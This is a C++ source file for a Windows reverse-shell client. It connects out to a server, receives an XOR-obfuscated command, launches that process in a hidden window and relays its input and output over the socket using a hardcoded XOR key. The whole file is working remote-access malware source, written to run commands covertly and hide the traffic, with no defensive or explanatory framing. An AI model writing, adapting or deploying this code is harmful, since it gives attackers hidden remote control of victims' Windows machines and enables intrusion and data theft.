#include<ws2tcpip.h>
#include<winsock2.h>
#include<windows.h>
#include<thread>
#include<string>
#include<cstring>


class Client{
	private:
		std::string strPassword = "$up3rP@sSw0rD";
	public:
		SOCKET sckSocket = INVALID_SOCKET;
		bool isRunningShell = false;
		bool Connect(const char*, const char*);
		void CloseConnection();
		std::string Xor(const std::string);
		void SpawnShell(const char*);
		void threadReadShell(HANDLE);
		void threadWriteShell(HANDLE);
};

bool Client::Connect(const char* cHost, const char* cPort){
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	int iRet = getaddrinfo(cHost, cPort, &strctAd, &strctServer);
	if(iRet != 0){
		//getaddrinfo error
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == INVALID_SOCKET){
			//socket error
			continue;
		}
		if(connect(sckSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			//connect error
			continue;
		}
		//success
		break;
	}
	if(strctP == nullptr || sckSocket == INVALID_SOCKET){
		//unable to connect | socket werror
		freeaddrinfo(strctServer);
		return false;
	}
	freeaddrinfo(strctServer);
	return true;
}

void Client::CloseConnection(){
	if(sckSocket != INVALID_SOCKET){
		closesocket(sckSocket);
		sckSocket = INVALID_SOCKET;
	}
}

std::string Client::Xor(const std::string strMessage){
	std::string strFinal = "";
	for(char mC : strMessage){
		for(char xC : strPassword){
			mC ^= xC;
		}
		strFinal.append(1, mC);
	}
	return strFinal;
}

void Client::threadReadShell(HANDLE hPipe){
	int iLen = 0, iRet = 0;
	char cBuffer[512], cBuffer2[512 * 2 + 30];
	std::string strCmd = "";
	DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
	BYTE bPChar = 0;
	while(isRunningShell){
		if(PeekNamedPipe(hPipe, nullptr, 0, &dBytesReaded, nullptr, nullptr)){
			if(dBytesReaded > 0){
				ReadFile(hPipe, cBuffer, 512, &dBytesReaded, nullptr);
			} else {
				Sleep(100);
				continue;
			}
			for(dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++){
				if(cBuffer[dBufferC] == '\n' && bPChar != '\r'){
					cBuffer2[dBytesToWrite++] = '\r';
				}
				bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
			}
			cBuffer2[dBytesToWrite] = '\0';
			strCmd.erase(strCmd.begin(), strCmd.end());
			strCmd = Xor(std::string(cBuffer2));
			iLen = strCmd.length();
			iRet = send(sckSocket, strCmd.c_str(), iLen, 0);
			if(iRet <= 0){
				isRunningShell = false;
				break;
			}
		} else {
			//PeekNamedPipe error
			isRunningShell = false;
			break;
		}
	}
}

void Client::threadWriteShell(HANDLE hPipe){
	int iRet = 0;
	char cRecvBytes[1], cBuffer[2048];
	std::string strCmd = "";
	DWORD dBytesWrited = 0, dBufferC = 0;
	while(isRunningShell){
		iRet = recv(sckSocket, cRecvBytes, 1, 0);
		if(iRet <= 0){
			isRunningShell = false;
			break;
		}
		strCmd.erase(strCmd.begin(), strCmd.end());
		strCmd = Xor(std::string(cRecvBytes));
		cBuffer[dBufferC++] = strCmd[0];
		if(strCmd[0] == '\r'){
			cBuffer[dBufferC++] = '\n';
		}
		if(strncmp(cBuffer, "exit", 4) == 0){ 
			isRunningShell = false;
			break;
		}
		if(strCmd[0] == '\n' || strCmd[0] == '\r' || dBufferC > 2047){
			if(!WriteFile(hPipe, cBuffer, dBufferC, &dBytesWrited, nullptr)){
				//Error escribiendo a la tuberia
				isRunningShell = false;
				break;
			}
			dBufferC = 0;
		}
	}
	
}

void Client::SpawnShell(const char* strCmd){
   PROCESS_INFORMATION pi;
   HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
   stdinRd = stdinWr = stdoutRd = stdoutWr = nullptr;
   SECURITY_ATTRIBUTES sa;
   sa.nLength = sizeof(SECURITY_ATTRIBUTES);
   sa.lpSecurityDescriptor =  nullptr;
   sa.bInheritHandle = true;
   std::string strMessage = "";
   int iLen = 0;
   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)){
      //No se pudo crear las tuberias
      strMessage = Xor(std::string("xx0"));
      iLen = strMessage.length();
	  send(sckSocket, strMessage.c_str(), iLen, 0);
      return;                      
   }
   STARTUPINFO si; 
   GetStartupInfo(&si);
   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.hStdOutput = stdoutWr;
   si.hStdError = stdoutWr;
   si.hStdInput = stdinRd;
   char cCmd[1024];
   strncpy(cCmd, &strCmd[2], 1023);
   if(CreateProcess(nullptr, cCmd, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi) == 0){
      //No se pudo invocar la shell
      strMessage = Xor(std::string("xx0"));
      iLen = strMessage.length();
	  send(sckSocket, strMessage.c_str(), iLen, 0);
      return;                        
   }
   //A este punto la shell se esta ejecutando correctamente
   strMessage = Xor(std::string("xx1"));
   iLen = strMessage.length();
   send(sckSocket, strMessage.c_str(), iLen, 0);
   isRunningShell = true;
   std::thread tRead(&Client::threadReadShell, this, stdoutRd);
   std::thread tWrite(&Client::threadWriteShell, this, stdinWr);
   tRead.join();
   tWrite.join();
   TerminateProcess(pi.hProcess, 0);
   if(stdinRd != nullptr){
		CloseHandle(stdinRd);
		stdinRd = nullptr;
	} 
	if(stdinWr != nullptr){
		CloseHandle(stdinWr);
		stdinWr = nullptr;
	} 
	if(stdoutRd != nullptr){
		CloseHandle(stdoutRd);
		stdoutRd = nullptr;
	} 
	if(stdoutWr != nullptr){
		CloseHandle(stdoutWr);
		stdoutWr = nullptr;
	}
	isRunningShell = false;
}

int main(){
	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
	   //error
	   return 0;
	}
	Client *Cli = new Client;
	if(Cli->Connect("127.0.0.1", "1337")){
		char cCmdLine[128];
		int iBytes = recv(Cli->sckSocket, cCmdLine, 128, 0);
		if(iBytes > 0){
			cCmdLine[iBytes] = '\0';
			std::string strCmd = Cli->Xor(std::string(cCmdLine));
			Cli->SpawnShell(strCmd.c_str());
			Cli->CloseConnection();
		} else {
			//error
		}
	}
	delete Cli;
	Cli = nullptr;
	WSACleanup();
	return 0;
}
